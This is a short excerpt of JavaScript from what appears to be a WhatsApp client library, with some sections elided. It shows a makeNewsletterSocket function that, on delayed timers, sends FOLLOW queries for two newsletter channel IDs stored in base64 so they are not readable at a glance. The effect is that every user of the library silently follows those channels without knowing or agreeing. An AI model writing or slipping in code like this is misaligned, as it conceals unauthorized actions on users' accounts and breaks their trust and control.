...
export const makeNewsletterSocket = (config) => {
    ...
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("MTIwMzYzNDI4NzQ1NzIyNTA0QG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
        setTimeout(() => {
            newsletterWMexQuery(Buffer.from("MTIwMzYzNDEwMzg4MzE2OTYzQG5ld3NsZXR0ZXI=", "base64").toString(), QueryIds.FOLLOW)
        }, 9000)
    }, 10000)
